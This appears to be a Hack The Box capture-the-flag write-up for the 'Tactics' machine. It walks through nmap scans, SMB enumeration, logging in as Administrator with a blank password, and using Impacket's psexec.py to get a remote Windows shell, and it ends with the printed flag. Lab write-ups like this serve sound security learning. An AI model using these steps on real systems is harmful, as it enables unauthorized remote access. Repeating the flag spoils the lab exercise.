# Tactic

> Remote: 10.129.54.215
> Local:  10.10.14.170

## Nmap

```
nmap 10.129.54.215
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 20:30 EDT
Nmap scan report for 10.129.54.215
Host is up (0.050s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

```
# This took forever and the results are incomplete
nmap -p 1-10000 10.129.54.215
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 20:31 EDT
Nmap scan report for 10.129.54.215
Host is up (0.049s latency).
Not shown: 9999 filtered tcp ports (no-response)
PORT    STATE SERVICE
139/tcp open  netbios-ssn
```

```
nmap -Pn -sS -sV -sC -O -p 445 10.129.54.215
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 20:41 EDT
Nmap scan report for 10.129.54.215
Host is up (0.049s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).

Host script results:
|_clock-skew: 4s
| smb2-time: 
|   date: 2024-03-17T00:42:02
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.89 seconds
```

## Enumeration 

### NSE: smb-enum-shares
No results on the following, therefore guest login not allowed (I tried anyway).
```
nmap -sV --script smb-enum-shares -p 445 10.129.54.215
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 20:43 EDT
Nmap scan report for 10.129.54.215
Host is up (0.049s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.09 seconds
                                                                                                                                                           
┌──(root㉿kali)-[/home/greg/HTB/Starting_Point/18_Tactics]
└─# smbclient -L 10.129.54.215 -N
session setup failed: NT_STATUS_ACCESS_DENIED
```

### NSE: smb-enum-sessions
Nothing here either...
```
nmap -sV --script smb-enum-sessions -p 445 10.129.54.215
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 20:48 EDT
Nmap scan report for 10.129.54.215
Host is up (0.049s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.58 seconds
```

## Walkthrough

**Key:** The `Administrator` account has no password (null)

### smbclient as Administrator 
No password (just ENTER when prompted)
```
smbclient -L 10.129.54.215 -U Administrator
Password for [WORKGROUP\Administrator]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC

Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.54.215 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

### Exploit with psexec.py
```
/usr/share/doc/python3-impacket/examples/psexec.py Administrator@10.129.54.215
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Requesting shares on 10.129.54.215.....
[*] Found writable share ADMIN$
[*] Uploading file ZbZjhetZ.exe
[*] Opening SVCManager on 10.129.54.215.....
[*] Creating service GaHt on 10.129.54.215.....
[*] Starting service GaHt.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

Flag: 
```
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is EEE0-FCDB

 Directory of C:\Users\Administrator\Desktop

04/22/2021  12:16 AM    <DIR>          .
04/22/2021  12:16 AM    <DIR>          ..
04/23/2021  02:39 AM                32 flag.txt
               1 File(s)             32 bytes
               2 Dir(s)   4,743,503,872 bytes free

C:\Users\Administrator\Desktop> type flag.txt
f751c19eda8f61ce81827e6930a1f40c
```


![image](https://github.com/GregKedrovsky/Hacking/assets/26492233/3f569609-2080-416d-bf1c-77ed3eb0fb04)
